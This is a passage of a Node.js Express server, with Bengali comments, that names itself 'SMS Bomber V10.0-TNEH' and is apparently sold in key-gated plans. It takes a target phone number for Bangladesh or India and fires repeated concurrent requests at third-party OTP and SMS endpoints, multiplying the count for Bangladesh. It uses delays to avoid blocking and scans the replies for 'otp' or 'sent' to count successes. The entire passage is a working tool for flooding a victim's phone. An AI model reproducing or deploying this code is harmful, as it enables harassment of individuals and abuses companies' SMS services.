  let url = api.url.replace(/{phone}/g, phone).replace(/{phone_10}/g, phone.slice(-10)).replace(/{ts}/g, Date.now());
  
  let origin = '';
  try { origin = new URL(url).origin; } catch {}

  const headers = getHeaders({
    ...(origin ? { 'Origin': origin, 'Referer': origin + '/' } : {}),
    ...(api.headers || {})
  });

  const cfg = {
    method: api.method,
    url,
    headers,
    timeout: CONFIG.performance.timeout,
    validateStatus: () => true,
    maxRedirects: 3,
    responseType: 'text'
  };

  // Body ভেরিয়েবল রিপ্লেস
  if (api.method === 'POST' || api.method === 'PUT') {
    if (api.body) {
      let dataStr = api.body
        .replace(/{phone}/g, phone)
        .replace(/{phone_10}/g, phone.slice(-10))
        .replace(/{ts}/g, Date.now());
      
      cfg.data = dataStr;
      if (!cfg.headers['Content-Type']) {
        cfg.headers['Content-Type'] = api.isFormData ? 'application/x-www-form-urlencoded' : 'application/json';
      }
    }
  }

  let status = 0, ok = false, errMsg = null, respBody = '';
  try {
    const r = await axios(cfg);
    status = r.status;
    respBody = typeof r.data === 'string' ? r.data : JSON.stringify(r.data || '');
    const bodyLower = respBody.toLowerCase();
    
    // সাকসেস ডিটেকশন (OTP বা Success টেক্সট খুঁজবে)
    const hasSuccessKeyword =
      bodyLower.includes('otp') || bodyLower.includes('success') || bodyLower.includes('sent') ||
      bodyLower.includes('"status":true') || bodyLower.includes('"success":true') || bodyLower.includes('"error":false');
      
    ok = (status >= 200 && status < 300) && (hasSuccessKeyword || respBody.length < 80);
    if (!ok && status >= 200) errMsg = `2xx but no keyword`;
  } catch (e) {
    status = e.response ? e.response.status : 0;
    errMsg = (e.code || e.message || 'ERR').slice(0, 120);
    ok = false;
  }
  return { ok, status, error: errMsg };
}

// Queue Runner (একটার পর একটা রিকোয়েস্ট যাবে)
async function blast(apis, phone, count, jobId, region) {
  const queue = [];
  // ইন্ডিয়ান রিকোয়েস্টের জন্য count বাড়ালে ততবার যাবে, BD-এর জন্য ৫ গুণ
  const multiplier = region === 'BD' ? 5 : 1;
  const perApiCount = (parseInt(count) || 1) * multiplier;

  for (const api of apis) {
    for (let i = 0; i < perApiCount; i++) {
      queue.push({ api, phone, jobId });
    }
  }

  const t0 = Date.now();
  const CONCURRENCY = CONFIG.performance.concurrency;
  let cursor = 0, fired = 0;

  // Worker Function যা কিউ থেকে ডেটা নিয়ে প্রসেস করবে
  async function worker() {
    while (cursor < queue.length) {
      if (!jobs.isActive(jobId)) return; // স্টপ কমান্ড দিলে থেমে যাবে
      
      const idx = cursor++;
      const item = queue[idx];
      
      const r = await callOne(item.api, item.phone, item.jobId);
      fired++;
      if (!r.stopped) jobs.bump(jobId, r.ok, r.error);
      
      // রিকোয়েস্টের মাঝে ছোট delay (DoS ব্লক এড়ানোর জন্য)
      await new Promise(res => setTimeout(res, 50));
    }
  }

  // কনকারেন্ট ওয়ার্কার চালু করা (একসাথে ৫টি)
  const workers = [];
  for (let i = 0; i < CONCURRENCY; i++) workers.push(worker());
  await Promise.all(workers);

  console.log(`💥 ${region} job ${jobId}: ${fired}/${queue.length} calls in ${Date.now() - t0}ms`);
  return { fired, queued: queue.length };
}

// ============================================================
// EXPRESS
// ============================================================
const app = express();
app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false }));
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

app.get('/', (req, res) => {
  res.json({ success: true, developer: DEVELOPER_INFO, message: 'SMS Bomber V10.0-TNEH running' });
});

app.get('/api/health', (req, res) => {
  res.json({ status: 'active', version: "10.0.0-TNEH", bd_apis: BD_APIS.length, india_apis: IN_APIS.length, active_jobs: jobs.active.size });
});

// ---- BD Spam ----
app.get('/api/spam', async (req, res) => {
  const { plan, number, count = 1, key } = req.query;
  let planConfig = PLAN_CONFIG.default;
  if (plan && PLAN_CONFIG[plan]) planConfig = PLAN_CONFIG[plan];

  if (planConfig.requiresKey) {
    if (!key || !keys.validate(key)) return res.status(401).json({ success: false, error: ERROR_MESSAGES.INVALID_API_KEY });
    keys.use(key);
  }
  if (!number) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM });

  // নম্বর চেক করা (BD এর জন্য)
  if (!Utility.isValidBD(number)) return res.status(400).json({ success: false, error: ERROR_MESSAGES.INVALID_PHONE });

  // নম্বর নরমালাইজ করা: 017... -> 88017...
  const clean = Utility.normalizeBD(number);
  let per = parseInt(count) || 1;
  if (per < 1) per = 1;
  if (per > planConfig.maxCount) return res.status(400).json({ success: false, error: `Max ${planConfig.maxCount}` });

  const finalPerApi = per * 5;
  const totalCalls = BD_APIS.length * finalPerApi;

  const jobId = jobs.create({ phone: clean, region: 'BD', total: totalCalls });
  blast(BD_APIS, clean, per, jobId, 'BD').catch(e => { console.error(e); jobs.stop(jobId); });

  res.json({
    success: true, jobId, region: 'BD', total_unique: BD_APIS.length, calls_per_api: finalPerApi, total_sms: totalCalls,
    status_endpoint: `/api/status?jobId=${jobId}`, stop_endpoint: `/api/stop?jobId=${jobId}`
  });
});

// ---- IN Spam ----
app.get('/api/India', async (req, res) => {
  if (req.query.stop !== undefined) {
    const jobid = req.query.jobid || req.query.jobId;
    if (jobid === 'all' || req.query.stop === 'all') return res.json({ success: true, stopped_count: jobs.stopAll('IN') });
    if (!jobid) return res.status(400).json({ success: false, error: 'jobid required' });
    return res.json({ success: jobs.stop(jobid), jobId: jobid });
  }

  const { number, count = 1, plan, key } = req.query;
  let planConfig = PLAN_CONFIG.default;
  if (plan && PLAN_CONFIG[plan]) planConfig = PLAN_CONFIG[plan];

  if (planConfig.requiresKey) {
    if (!key || !keys.validate(key)) return res.status(401).json({ success: false, error: ERROR_MESSAGES.INVALID_API_KEY });
    keys.use(key);
  }
  if (!number) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM });

  // নম্বর চেক করা (IN এর জন্য)
  if (!Utility.isValidIN(number)) return res.status(400).json({ success: false, error: ERROR_MESSAGES.INVALID_PHONE });

  // নম্বর নরমালাইজ করা (91... বা 0... বাদ দিয়ে শুধু ১০ ডিজিট)
  const clean = Utility.normalizeIN(number);
  let per = parseInt(count) || 1;
  if (per < 1) per = 1;
  if (per > planConfig.maxCount) return res.status(400).json({ success: false, error: `Max ${planConfig.maxCount}` });

  const totalCalls = IN_APIS.length * per;
  const jobId = jobs.create({ phone: clean, region: 'IN', total: totalCalls });
  blast(IN_APIS, clean, per, jobId, 'IN').catch(e => { console.error(e); jobs.stop(jobId); });

  res.json({
    success: true, jobId, region: 'IN', total_unique: IN_APIS.length, calls_per_api: per, total_sms: totalCalls,
    status_endpoint: `/api/status?jobId=${jobId}`, stop_endpoint: `/api/India?stop&jobid=${jobId}`
  });
});

app.get('/api/stop', (req, res) => {
  const { jobId, all } = req.query;
  if (all === 'true') return res.json({ success: true, stopped_count: jobs.stopAll() });
  if (jobId) return res.json({ success: jobs.stop(jobId), jobId });
  res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM });
});

app.get('/api/status', (req, res) => {
  const { jobId } = req.query;
  if (jobId) {
    const j = jobs.view(jobId);
    if (!j) return res.status(404).json({ success: false, error: ERROR_MESSAGES.JOB_NOT_FOUND });
    return res.json({ success: true, job: j });
  }
  res.json({ success: true, stats: jobs.summary(), jobs: jobs.all() });
});

app.use((req, res) => res.status(404).json({ success: false, error: 'Endpoint not found', path: req.path }));

// ============================================================
// START (Vercel-এর জন্য)
// ============================================================
if (require.main === module) {
  const server = app.listen(CONFIG.server.port, CONFIG.server.host, () => {
    console.log(`\n🚀 SMS BOMBER V10.0-TNEH`);
    console.log(`📊 BD: ${BD_APIS.length} | IN: ${IN_APIS.length}`);
    console.log(`⚙️ Concurrency: ${CONFIG.performance.concurrency} (Queue System)\n`);
  });
  server.timeout = 180000;
  server.keepAliveTimeout = 65000;
}

module.exports = app;
